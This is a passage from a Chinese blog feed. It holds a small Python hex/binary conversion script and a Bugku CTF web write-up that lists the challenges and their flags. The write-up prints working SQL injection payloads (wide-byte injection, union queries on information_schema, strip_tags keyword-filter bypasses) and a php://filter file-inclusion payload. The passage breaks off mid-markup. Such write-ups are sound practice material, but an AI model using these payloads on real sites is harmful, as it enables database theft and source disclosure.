    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/8/10</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : 二进制十六进制ASCII</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#十六进制转二进制</span></span><br><span class="line">hex_ = bin(<span class="number">0x666c6167</span>)</span><br><span class="line"><span class="comment">#二进制转十六进制</span></span><br><span class="line">bi = hex(int(<span class="string">'1100110011011000110000101100111'</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(hex_)</span><br><span class="line">print(bi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ASCII转十六进制</span></span><br><span class="line">a = binascii.b2a_hex(<span class="string">b'flag'</span>)</span><br><span class="line"><span class="comment">#十六进制转ASCII</span></span><br><span class="line">b = binascii.a2b_hex(a)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0b1100110011011000110000101100111</span><br><span class="line">0x666c6167</span><br><span class="line">b&apos;666c6167&apos;</span><br><span class="line">b&apos;flag&apos;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/python3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Time    : 2018/8/10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Author  : Lhaihai&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @File    : 二进制十六进制ASCII&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Software: PyCharm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Blog    : http://blog.Lhaihai.wang&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    Description : &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#十六进制转二进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hex_ = bin(&lt;span class=&quot;number&quot;&gt;0x666c6167&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#二进制转十六进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bi = hex(int(&lt;span class=&quot;string&quot;&gt;&#39;1100110011011000110000101100111&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(hex_)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(bi)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ASCII转十六进制&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a = binascii.b2a_hex(&lt;span class=&quot;string&quot;&gt;b&#39;flag&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#十六进制转ASCII&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;b = binascii.a2b_hex(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(b)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://blog.Lhaihai.wang/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>bugku-web-Writeup</title>
    <link href="http://blog.Lhaihai.wang/2018/07/13/bugku-web-Writeup/"/>
    <id>http://blog.Lhaihai.wang/2018/07/13/bugku-web-Writeup/</id>
    <published>2018-07-13T02:57:21.000Z</published>
    <updated>2018-07-13T03:32:37.762Z</updated>
    
    <content type="html"><![CDATA[<p>慢慢刷了这么多题目，需要总结一下</p><a id="more"></a><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><blockquote><p>听说聪明的人都能找到答案<a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a> </p></blockquote><p>查看源代码即可发现，F12</p><blockquote><p>KEY{Web-2-bugKssNNikls9100}</p></blockquote><h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><blockquote><p><a href="http://103.238.227.13:10085/" target="_blank" rel="noopener">http://103.238.227.13:10085/</a></p><p>Flag格式：Flag:xxxxxxxxxxxxx</p></blockquote><p>bp抓包改content-type为image/jpeg就行了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526912306079.png" alt="1526912306079"></p><blockquote><p>Flag:42e97d465f962c53df9549377b513c7e </p></blockquote><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a> </p></blockquote><p>输入的时候发现只能输入一位数字，F12修改maxlength即可</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526912420436.png" alt="1526912420436"></p><blockquote><p>flag{CTF-bugku-0032}</p></blockquote><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><blockquote><p>flag就在这里快来找找吧 <a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a> </p></blockquote><p>查看源代码，在最后发现</p><blockquote><p>&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&amp;#125 </p></blockquote><p>熟悉的同学就知道这是Unicode编码，Unicode解密一下就得到key</p><p>Unicode解码网址：<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><blockquote><p>KEY{J2sa42ahJK-HS11III}</p></blockquote><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><blockquote><p><a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p><p>格式KEY{}</p></blockquote><p>进来一看</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526914080428.png" alt="1526914080428"></p><blockquote><p>查询key表,id=1的string字段 ，这个应该就是flag了</p></blockquote><p>查看源代码，发现是gb2312，想到宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;gb2312&quot; /&gt;</span><br></pre></td></tr></table></figure><p>尝试一下，得到下面报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27</span><br></pre></td></tr></table></figure><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘’1運’’  LIMIT 1’ at line 1 </p></blockquote><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526914024002.png" alt="1526914024002"></p><p>获得数据库 sql5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/index.php</span><br><span class="line">?id=1%df%27 union select user(),database() %23</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526913249659.png" alt="1526913249659"></p><p>获得表 key，test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema =database() %23</span><br></pre></td></tr></table></figure><p>获得列 id ,string(  0x6b6579 是 key的16进制)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6b6579 %23</span><br></pre></td></tr></table></figure><p>获得string</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df%27 union select 1,group_concat(string) from sql5.key %23</span><br></pre></td></tr></table></figure><blockquote><p>KEY{54f3320dc261f313ba712eb3f13a1f6d }</p></blockquote><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><blockquote><p>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag </p></blockquote><p>windows下修改域名解析的 文件为：</p><p>c:\windows\system32\drivers\etc\hosts </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1526918093124.png" alt="1526918093124"></p><p>加上后访问flag.bugku.com就可以拿到flag</p><blockquote><p>KEY{DSAHDSJ82HDS2211} </p></blockquote><p><a href="https://blog.csdn.net/qq_32447321/article/details/76269619" target="_blank" rel="noopener">配置windows下域名解析</a> </p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><blockquote><p>地址：<a href="http://103.238.227.13:10087/" target="_blank" rel="noopener">http://103.238.227.13:10087/</a></p><p>提示：过滤了关键字 你能绕过他吗</p><p>flag格式KEY{xxxxxxxxxxxxx}</p></blockquote><blockquote><p>访问参数为：?id=x</p><p>查找表为key的数据表，id=1值hash字段值</p></blockquote><p>题目意思是要找数据表key的hash字段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤sql</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'table'</span>,<span class="string">'union'</span>,<span class="string">'and'</span>,<span class="string">'or'</span>,<span class="string">'load_file'</span>,<span class="string">'create'</span>,<span class="string">'delete'</span>,<span class="string">'select'</span>,<span class="string">'update'</span>,<span class="string">'sleep'</span>,<span class="string">'alter'</span>,<span class="string">'drop'</span>,<span class="string">'truncate'</span>,<span class="string">'from'</span>,<span class="string">'max'</span>,<span class="string">'min'</span>,<span class="string">'order'</span>,<span class="string">'limit'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (substr_count($id, $value) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'包含敏感关键字！'</span>.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//xss过滤</span></span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p>分析一下过滤代码，一看过滤了union，select，这还怎么玩，看下去发现有个strip_tags($id)，去查了查这个函数</p><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 </p><p><a href="http://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strip_tags.asp</a></p><p><a href="http://php.net/strip_tags" target="_blank" rel="noopener">http://php.net/strip_tags</a></p><p>可以玩了，可以在敏感关键字中加入HTML标记，绕过关键字过滤，然后再经过strip_tags()函数还原为select等待</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sele&lt;a&gt;ct    selec&lt;p&gt;t</span><br></pre></td></tr></table></figure><p>strip_tags()之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></figure><p>也可以用%00</p><p>获得数据库 sql3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 uni&lt;a&gt;on selec&lt;a&gt;t 1,database() %23</span><br></pre></td></tr></table></figure><p>获得表 hash,key,temp </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 unio&lt;a&gt;n sele&lt;a&gt;ct 1,gr&lt;a&gt;oup_concat(tabl&lt;a&gt;e_name) fro&lt;a&gt;m info&lt;a&gt;rmation_schema.tab&lt;a&gt;les where tab&lt;a&gt;le_schema =database() %23</span><br></pre></td></tr></table></figure><p>获得hash    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 unio&lt;a&gt;n sele&lt;a&gt;ct 1,gr&lt;a&gt;oup_concat(hash) fro&lt;a&gt;m sql3.key %23</span><br></pre></td></tr></table></figure><blockquote><p>KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}</p></blockquote><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/web12/" target="_blank" rel="noopener">http://120.24.86.145:8002/web12/</a></p><p>作者：@berTrAM</p></blockquote><p>bp抓几次包，repeat几次就拿到了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527003672930.png" alt="1527003672930"></p><blockquote><p>flag{dummy_game_1s_s0_popular}</p></blockquote><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><blockquote><p>地址：<a href="http://120.24.86.145:8003/" target="_blank" rel="noopener">http://120.24.86.145:8003/</a></p></blockquote><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><blockquote><p><a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a> </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中preg_match正则表达式的 意思是，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符组成。如果不匹配会输出 ‘’args error!‘’\</p><p><a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">正则表达式手册</a></p><p>而下一句的$$args,比较有意思。解析一下，PHP中变量可以当作另一个变量的变量名。<br>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'b'</span>;</span><br><span class="line">$b=<span class="string">"Boogle"</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);  <span class="comment">//输出   Boogle</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再看第一句提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! </span><br><span class="line">//flag 在变量中。</span><br></pre></td></tr></table></figure><p>那么结合两者，可以想到一个很有意思的变量－－－－$GLOBALS：一个包含了全部变量的全局组合数组。</p><p>构造payloaｄ：<code>?args=BLOBLAS</code></p><p>即可爆出所有变量，其中包含flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;92853051ab894a64f7865cf3c2128b34&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{92853051ab894a64f7865cf3c2128b34} </p></blockquote><p> <a href="https://blog.csdn.net/l3oog1e/article/details/72772633?utm_source=itdadao&amp;utm_medium=referral" target="_blank" rel="noopener">bugku ctf平台之变量1 write up</a> </p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><blockquote><p>JSPFUCK??????答案格式CTF{<strong><em>\</em></strong>}</p><p><a href="http://120.24.86.145:8002/web5/" target="_blank" rel="noopener">http://120.24.86.145:8002/web5/</a></p><p>字母大写</p></blockquote><p>查看一下源代码，发现JSFUCK，直接F12在控制台运行一下就出来了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527005094676.png" alt="1527005094676"></p><blockquote><p>CTF{whatfk}</p></blockquote><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><blockquote><p><a href="http://120.24.86.145:9009/hd.php" target="_blank" rel="noopener">http://120.24.86.145:9009/hd.php</a> </p></blockquote><p>发现啥都没有，那就抓个包看看吧</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527005481392.png" alt="1527005481392"></p><blockquote><p>flag{Bugku_k8_23s_istra}</p></blockquote><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><blockquote><p><a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a> </p></blockquote><p>点进去看见有file=show.php，本地文件包含</p><p>payload:</p><blockquote><p><a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p></blockquote><p>读取得</p><blockquote><p>PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>flag:flag{edulcni_elif_lacol_si_siht}</p></blockquote><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><blockquote><p>看看源代码吧</p><p><a href="http://120.24.86.145:8002/web4/" target="_blank" rel="noopener">http://120.24.86.145:8002/web4/</a></p></blockquote><p><a href="http://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() 函数</a></p><p>该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 